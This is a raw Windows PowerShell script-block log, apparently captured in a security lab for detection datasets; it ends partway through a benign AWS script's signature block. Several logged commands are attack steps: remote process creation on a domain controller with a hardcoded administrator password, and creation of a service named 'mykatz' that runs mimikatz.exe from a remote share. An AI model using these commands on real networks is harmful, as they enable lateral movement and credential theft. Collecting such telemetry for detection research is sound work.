+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:53:18.225049300Z'/><EventRecordID>740406</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0002-2699-E22E5457D901}'/><Execution ProcessID='6992' ThreadID='6740'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>&amp; {# Set the remote computer name and credentials
+ $RemoteComputer = "mswin-dc01.attackrange.local"
+ $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
+ $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword
+
+ # Create a CIM session
+ $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential
+
+ # Define the process you want to start
+ $ProcessToStart = "calc.exe"
+
+ # Invoke the Create method on the Win32_Process class to start the process
+ $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}
+
+ # Check the result
+ if ($Result.ReturnValue -eq 0) {
+ Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
+ } else {
+ Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
+ }
+
+ # Clean up the CIM session
+ Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>b86036ea-9afa-4de1-b993-d228f546ddf0</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:37:21.503379200Z'/><EventRecordID>739993</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-6376-DE2E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Set the remote computer name and credentials
+$RemoteComputer = "mswin-dc01.attackrange.local"
+$Credentials = Get-Credential
+
+# Create a CIM session
+$CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credentials
+
+# Define the process you want to start
+$ProcessToStart = "calc.exe"
+
+# Invoke the Create method on the Win32_Process class to start the process
+$Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}
+
+# Check the result
+if ($Result.ReturnValue -eq 0) {
+    Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
+} else {
+    Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
+}
+
+# Clean up the CIM session
+Remove-CimSession -CimSession $CimSession</Data><Data Name='ScriptBlockId'>12c1b119-7475-436b-a4ae-b82535d03664</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:36:45.977120600Z'/><EventRecordID>739940</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-1CA0-DF2E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Set the remote computer name and credentials
+$RemoteComputer = "mswin-dc01.attackrange.local"
+$Credentials = Get-Credential
+
+# Create a CIM session
+$CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credentials
+
+# Define the process you want to start
+$ProcessToStart = "calc.exe"
+
+# Invoke the Create method on the Win32_Process class to start the process
+$Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}
+
+# Check the result
+if ($Result.ReturnValue -eq 0) {
+    Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
+} else {
+    Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
+}
+
+# Clean up the CIM session
+Remove-CimSession -CimSession $CimSession</Data><Data Name='ScriptBlockId'>1407819a-1eed-4784-bde3-e83659c958cd</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:25:17.318132400Z'/><EventRecordID>739771</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-3D74-DE2E5457D901}'/><Execution ProcessID='4852' ThreadID='7072'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>449fe1ad-1403-45ec-aa1f-e133217e4a82</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:25:17.318120900Z'/><EventRecordID>739765</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-3D74-DE2E5457D901}'/><Execution ProcessID='4852' ThreadID='7072'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>acc26cc8-b344-451b-857c-8f5a481f1a48</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:25:17.318107800Z'/><EventRecordID>739759</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-3D74-DE2E5457D901}'/><Execution ProcessID='4852' ThreadID='7072'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>17af4915-c552-4350-82a2-cf5a73dd4e8e</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:13:35.781870700Z'/><EventRecordID>739636</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-139D-DF2E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>$ComputerName = 'localhost'  # adjust to your server names
+$Credential   = Get-Credential         # submit a user account with proper permissions
+
+# define the arguments you want to submit to the method
+# remove values that you do not want to submit
+# make sure you replace values with meaningful content before running the code
+# see section "Parameters" below for a description of each argument.
+$arguments = @{
+    DesktopInteract = [Boolean](12345)  # replace 12345 with a meaningful value
+    DisplayName     = 'mykatz'  # replace 'someText' with meaningful text
+    ErrorControl    = [UInt8](1)  # replace 12345 with a meaningful value
+    LoadOrderGroup  = 'someText'  # replace 'someText' with meaningful text
+    LoadOrderGroupDependencies = 'someText'  # replace 'someText' with meaningful text
+    Name            = 'mykatz'  # replace 'someText' with meaningful text
+    PathName        = '\\10.0.1.17\c$\temp\mimikatz.exe'  # replace 'someText' with meaningful text
+    ServiceDependencies = 'mykatz'  # replace 'someText' with meaningful text
+    ServiceType     = [UInt8](12345)  # replace 12345 with a meaningful value
+    StartMode       = 'OWN_PROCESS'  # replace 'someText' with meaningful text
+    StartName       = 'administrator'  # replace 'someText' with meaningful text
+    StartPassword   = 'P@ssword1'  # replace 'someText' with meaningful text
+}
+
+
+$session = New-CimSession -ComputerName $ComputerName -Credential $Credential
+
+Invoke-CimMethod -ClassName Win32_Service -Namespace Root/CIMV2 -MethodName Create -Arguments $arguments -CimSession $session |
+Add-Member -MemberType ScriptProperty -Name ReturnValueFriendly -Passthru -Value {
+  switch ([int]$this.ReturnValue)
+  {
+        0        {'Success'}
+        1        {'Not Supported'}
+        2        {'Access Denied'}
+        3        {'Dependent Services Running'}
+        4        {'Invalid Service Control'}
+        5        {'Service Cannot Accept Control'}
+        6        {'Service Not Active'}
+        7        {'Service Request Timeout'}
+        8        {'Unknown Failure'}
+        9        {'Path Not Found'}
+        10       {'Service Already Running'}
+        11       {'Service Database Locked'}
+        12       {'Service Dependency Deleted'}
+        13       {'Service Dependency Failure'}
+        14       {'Service Disabled'}
+        15       {'Service Logon Failed'}
+        16       {'Service Marked For Deletion'}
+        17       {'Service No Thread'}
+        18       {'Status Circular Dependency'}
+        19       {'Status Duplicate Name'}
+        20       {'Status Invalid Name'}
+        21       {'Status Invalid Parameter'}
+        22       {'Status Invalid Service Account'}
+        23       {'Status Service Exists'}
+        24       {'Service Already Paused'}
+        default  {'Unknown Error '}
+    }
+}
+
+
+Remove-CimSession -CimSession $session</Data><Data Name='ScriptBlockId'>c03fad18-b0ed-4829-9170-a52fcf15fe5f</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:13:17.521586000Z'/><EventRecordID>739605</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-E99C-DF2E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>$ComputerName = 'localhost'  # adjust to your server names
+$Credential   = Get-Credential         # submit a user account with proper permissions
+
+# define the arguments you want to submit to the method
+# remove values that you do not want to submit
+# make sure you replace values with meaningful content before running the code
+# see section "Parameters" below for a description of each argument.
+$arguments = @{
+    DesktopInteract = [Boolean](12345)  # replace 12345 with a meaningful value
+    DisplayName     = 'mykatz'  # replace 'someText' with meaningful text
+    ErrorControl    = [UInt8](mykatz)  # replace 12345 with a meaningful value
+    LoadOrderGroup  = 'someText'  # replace 'someText' with meaningful text
+    LoadOrderGroupDependencies = 'someText'  # replace 'someText' with meaningful text
+    Name            = 'mykatz'  # replace 'someText' with meaningful text
+    PathName        = '\\10.0.1.17\c$\temp\mimikatz.exe'  # replace 'someText' with meaningful text
+    ServiceDependencies = 'mykatz'  # replace 'someText' with meaningful text
+    ServiceType     = [UInt8](12345)  # replace 12345 with a meaningful value
+    StartMode       = 'OWN_PROCESS'  # replace 'someText' with meaningful text
+    StartName       = 'administrator'  # replace 'someText' with meaningful text
+    StartPassword   = 'P@ssword1'  # replace 'someText' with meaningful text
+}
+
+
+$session = New-CimSession -ComputerName $ComputerName -Credential $Credential
+
+Invoke-CimMethod -ClassName Win32_Service -Namespace Root/CIMV2 -MethodName Create -Arguments $arguments -CimSession $session |
+Add-Member -MemberType ScriptProperty -Name ReturnValueFriendly -Passthru -Value {
+  switch ([int]$this.ReturnValue)
+  {
+        0        {'Success'}
+        1        {'Not Supported'}
+        2        {'Access Denied'}
+        3        {'Dependent Services Running'}
+        4        {'Invalid Service Control'}
+        5        {'Service Cannot Accept Control'}
+        6        {'Service Not Active'}
+        7        {'Service Request Timeout'}
+        8        {'Unknown Failure'}
+        9        {'Path Not Found'}
+        10       {'Service Already Running'}
+        11       {'Service Database Locked'}
+        12       {'Service Dependency Deleted'}
+        13       {'Service Dependency Failure'}
+        14       {'Service Disabled'}
+        15       {'Service Logon Failed'}
+        16       {'Service Marked For Deletion'}
+        17       {'Service No Thread'}
+        18       {'Status Circular Dependency'}
+        19       {'Status Duplicate Name'}
+        20       {'Status Invalid Name'}
+        21       {'Status Invalid Parameter'}
+        22       {'Status Invalid Service Account'}
+        23       {'Status Service Exists'}
+        24       {'Service Already Paused'}
+        default  {'Unknown Error '}
+    }
+}
+
+
+Remove-CimSession -CimSession $session</Data><Data Name='ScriptBlockId'>d55a5a08-a5c0-4312-b9bf-f7f5ca4c1769</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:11:23.976765300Z'/><EventRecordID>739572</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-8093-E02E5457D901}'/><Execution ProcessID='3168' ThreadID='5484'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>$ComputerName = 'localhost'  # adjust to your server names
+$Credential   = Get-Credential         # submit a user account with proper permissions
+
+# define the arguments you want to submit to the method
+# remove values that you do not want to submit
+# make sure you replace values with meaningful content before running the code
+# see section "Parameters" below for a description of each argument.
+$arguments = @{
+    DesktopInteract = [Boolean](12345)  # replace 12345 with a meaningful value
+    DisplayName     = 'someText'  # replace 'someText' with meaningful text
+    ErrorControl    = [UInt8](12345)  # replace 12345 with a meaningful value
+    LoadOrderGroup  = 'someText'  # replace 'someText' with meaningful text
+    LoadOrderGroupDependencies = 'someText'  # replace 'someText' with meaningful text
+    Name            = 'someText'  # replace 'someText' with meaningful text
+    PathName        = 'someText'  # replace 'someText' with meaningful text
+    ServiceDependencies = 'someText'  # replace 'someText' with meaningful text
+    ServiceType     = [UInt8](12345)  # replace 12345 with a meaningful value
+    StartMode       = 'someText'  # replace 'someText' with meaningful text
+    StartName       = 'someText'  # replace 'someText' with meaningful text
+    StartPassword   = 'someText'  # replace 'someText' with meaningful text
+}
+
+
+$session = New-CimSession -ComputerName $ComputerName -Credential $Credential
+
+Invoke-CimMethod -ClassName Win32_Service -Namespace Root/CIMV2 -MethodName Create -Arguments $arguments -CimSession $session |
+Add-Member -MemberType ScriptProperty -Name ReturnValueFriendly -Passthru -Value {
+  switch ([int]$this.ReturnValue)
+  {
+        0        {'Success'}
+        1        {'Not Supported'}
+        2        {'Access Denied'}
+        3        {'Dependent Services Running'}
+        4        {'Invalid Service Control'}
+        5        {'Service Cannot Accept Control'}
+        6        {'Service Not Active'}
+        7        {'Service Request Timeout'}
+        8        {'Unknown Failure'}
+        9        {'Path Not Found'}
+        10       {'Service Already Running'}
+        11       {'Service Database Locked'}
+        12       {'Service Dependency Deleted'}
+        13       {'Service Dependency Failure'}
+        14       {'Service Disabled'}
+        15       {'Service Logon Failed'}
+        16       {'Service Marked For Deletion'}
+        17       {'Service No Thread'}
+        18       {'Status Circular Dependency'}
+        19       {'Status Duplicate Name'}
+        20       {'Status Invalid Name'}
+        21       {'Status Invalid Parameter'}
+        22       {'Status Invalid Service Account'}
+        23       {'Status Service Exists'}
+        24       {'Service Already Paused'}
+        default  {'Unknown Error '}
+    }
+}
+
+
+Remove-CimSession -CimSession $session</Data><Data Name='ScriptBlockId'>2ffb4069-45dd-4c49-b55e-1ad76f2c041b</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:46:04.587685400Z'/><EventRecordID>229024</EventRecordID><Correlation ActivityID='{CB9DD5DA-5B42-0003-2ED8-9DCB425BD901}'/><Execution ProcessID='10448' ThreadID='11176'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-21-2814101754-3021673353-4211140692-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>7fabfa72-6a11-4741-b8d2-6292cb0897a6</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:46:04.587665300Z'/><EventRecordID>229018</EventRecordID><Correlation ActivityID='{CB9DD5DA-5B42-0003-2ED8-9DCB425BD901}'/><Execution ProcessID='10448' ThreadID='11176'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-21-2814101754-3021673353-4211140692-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>8d53ff37-ceb0-4df4-bf04-cf9e0e37d979</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:46:04.587646900Z'/><EventRecordID>229012</EventRecordID><Correlation ActivityID='{CB9DD5DA-5B42-0003-2ED8-9DCB425BD901}'/><Execution ProcessID='10448' ThreadID='11176'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-21-2814101754-3021673353-4211140692-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>4902909e-bb4b-4b21-9502-b179bacbce34</Data><Data Name='Path'></Data></EventData></Event>
+<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-20T15:45:48.304347000Z'/><EventRecordID>228755</EventRecordID><Correlation ActivityID='{CB9DD5DA-5B42-0003-B9D7-9DCB425BD901}'/><Execution ProcessID='10448' ThreadID='11176'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-exch01.attackrange.local</Computer><Security UserID='S-1-5-21-2814101754-3021673353-4211140692-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>2</Data><Data Name='ScriptBlockText'># Copyright 2016 Amazon.com, Inc. or its affiliates. All Rights Reserved.
+#
+# Licensed under the Amazon Software License (the "License").
+# You may not use this file except in compliance with the License.
+# A copy of the License is located at
+#
+# http://aws.amazon.com/asl/
+#
+# or in the "license" file accompanying this file. This file is distributed
+# on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
+# express or implied. See the License for the specific language governing
+# permissions and limitations under the License.
+
+&lt;#-----------------------------------------------------------------------------------------------------------
+    Add-DnsSuffixList adds DNS suffixes.
+-------------------------------------------------------------------------------------------------------------#&gt;
+function Add-DnsSuffixList
+{
+  $state = Get-LaunchConfig -Key AddDnsSuffixList
+  [System.GC]::Collect()
+  if (-not $state)
+  {
+    Write-Log "Adding DNS suffix list is disabled"
+    return
+  }
+
+  $suffixList = @()
+
+  Write-Log ("Adding DNS suffixes in search list begins")
+
+  # Try to create a suffix with available zone
+  try
+  {
+    # Availability-zone includes period at the end, so it needs to remove it.
+    $availabilityZone = (Get-Metadata -UrlFragment "meta-data/placement/availability-zone").Trim()
+    if ($availabilityZone.EndsWith("."))
+    {
+      $availabilityZone = $availabilityZone.Substring(0,$availabilityZone.Length - 1)
+    }
+
+    $suffixList += "{0}.ec2-utilities.amazonaws.com" -f $availabilityZone.Substring(0,$availabilityZone.Length - 1)
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get availability zone: {0}" -f $_.Exception.Message)
+  }
+
+  # Try to get global search list
+  try
+  {
+    $tcpRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
+    $tcpRegRes = Get-ItemProperty -Path $tcpRegPath
+    $existingList = $tcpRegRes.SearchList -split ","
+    foreach ($existing in $existingList)
+    {
+      if ($existing -and $suffixList -notcontains $existing)
+      {
+        $suffixList += $existing.ToLower()
+      }
+    }
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get global search list: {0}" -f $_.Exception.Message)
+  }
+
+  # Try to get DNS Domain
+  try
+  {
+    $dnsDomain = $tcpRegRes.Domain
+    if ($dnsDomain -and $suffixList -notcontains $dnsDomain)
+    {
+      $suffixList += $dnsDomain.ToLower()
+    }
+    $isUsingDomainDevolution = $tcpRegRes.UseDomainNameDevolution
+    if ($isUsingDomainDevolution -ne 0)
+    {
+      $dnsDomains = $dnsDomain -split "\."
+      if ($dnsDomains.Length -gt 2)
+      {
+        $dns = $dnsDomains.Get($dnsDomains.Length - 1)
+        for ($i = $dnsDomains.Length - 2; $i -ge 1; $i --)
+        {
+          $dns = "{0}.{1}" -f $dnsDomains.Get($i),$dns
+          if ($dns -and $suffixList -notcontains $dns)
+          {
+            $suffixList += $dns.ToLower()
+          }
+        }
+      }
+    }
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get DNS domain from registry: {0}" -f $_.Exception.Message)
+  }
+
+  # Try to get NV Domain - contains computer's primary DNS suffix
+  try
+  {
+    $nvDomain = $tcpRegRes. "NV Domain"
+    if ($nvDomain -and $suffixList -notcontains $nvDomain)
+    {
+      $suffixList += $nvDomain.ToLower()
+    }
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get NV domain: {0}" -f $_.Exception.Message)
+  }
+
+  # Try to get DNS Domain from connected NICs
+  try
+  {
+    $networkAdapters = Get-CimInstance -ClassName Win32_NetworkAdapter
+    foreach ($networkAdapter in $networkAdapters)
+    {
+      # Check each NIC if it is connected (Connected = 2)
+      if ($networkAdapter.NetConnectionStatus -eq 2)
+      {
+        $networkConfig = Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -Filter "Index='$($networkAdapter.Index)'"
+        $nicDnsDomain = $networkConfig.DNSDomain
+        if ($nicDnsDomain -and $suffixList -notcontains $nicDnsDomain)
+        {
+          $suffixList += $nicDnsDomain.ToLower()
+        }
+      }
+    }
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to get DNS domain from NICs: {0}" -f $_.Exception.Message)
+  }
+
+  try
+  {
+    # Set DNS suffix search list
+    Invoke-CimMethod -ClassName Win32_NetworkAdapterConfiguration -MethodName "SetDNSSuffixSearchOrder" -Arguments @{ DNSDomainSuffixSearchOrder = $suffixList } | Out-Null
+  }
+  catch
+  {
+    Write-ErrorLog ("Failed to set DNS suffix search list: {0}" -f $_.Exception.Message)
+  }
+
+  Write-Log ("Adding DNS suffixes in search list done")
+}
+
+# SIG # Begin signature block
+# MIIuqgYJKoZIhvcNAQcCoIIumzCCLpcCAQExDzANBglghkgBZQMEAgEFADB5Bgor
+# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
+# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAwdXMjmgee8GrG
+# wK7q1ggMNwj1l3PZixsOVf6I/u33B6CCFBkwggXAMIIEqKADAgECAhAP0bvKeWvX
+# +N1MguEKmpYxMA0GCSqGSIb3DQEBCwUAMGwxCzAJBgNVBAYTAlVTMRUwEwYDVQQK
+# EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xKzApBgNV
+# BAMTIkRpZ2lDZXJ0IEhpZ2ggQXNzdXJhbmNlIEVWIFJvb3QgQ0EwHhcNMjIwMTEz
+# MDAwMDAwWhcNMzExMTA5MjM1OTU5WjBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMM
+# RGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQD
+# ExhEaWdpQ2VydCBUcnVzdGVkIFJvb3QgRzQwggIiMA0GCSqGSIb3DQEBAQUAA4IC
+# DwAwggIKAoICAQC/5pBzaN675F1KPDAiMGkz7MKnJS7JIT3yithZwuEppz1Yq3aa
+# za57G4QNxDAf8xukOBbrVsaXbR2rsnnyyhHS5F/WBTxSD1Ifxp4VpX6+n6lXFllV
+# cq9ok3DCsrp1mWpzMpTREEQQLt+C8weE5nQ7bXHiLQwb7iDVySAdYyktzuxeTsiT
+# +CFhmzTrBcZe7FsavOvJz82sNEBfsXpm7nfISKhmV1efVFiODCu3T6cw2Vbuyntd
+# 463JT17lNecxy9qTXtyOj4DatpGYQJB5w3jHtrHEtWoYOAMQjdjUN6QuBX2I9YI+
+# EJFwq1WCQTLX2wRzKm6RAXwhTNS8rhsDdV14Ztk6MUSaM0C/CNdaSaTC5qmgZ92k
+# J7yhTzm1EVgX9yRcRo9k98FpiHaYdj1ZXUJ2h4mXaXpI8OCiEhtmmnTK3kse5w5j
+# rubU75KSOp493ADkRSWJtppEGSt+wJS00mFt6zPZxd9LBADMfRyVw4/3IbKyEbe7
+# f/LVjHAsQWCqsWMYRJUadmJ+9oCw++hkpjPRiQfhvbfmQ6QYuKZ3AeEPlAwhHbJU
+# KSWJbOUOUlFHdL4mrLZBdd56rF+NP8m800ERElvlEFDrMcXKchYiCd98THU/Y+wh
+# X8QgUWtvsauGi0/C1kVfnSD8oR7FwI+isX4KJpn15GkvmB0t9dmpsh3lGwIDAQAB
+# o4IBZjCCAWIwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQU7NfjgtJxXWRM3y5n
+# P+e6mK4cD08wHwYDVR0jBBgwFoAUsT7DaQP4v0cB1JgmGggC72NkK8MwDgYDVR0P
+# AQH/BAQDAgGGMBMGA1UdJQQMMAoGCCsGAQUFBwMDMH8GCCsGAQUFBwEBBHMwcTAk
+# BggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEkGCCsGAQUFBzAC
+# hj1odHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRIaWdoQXNzdXJh
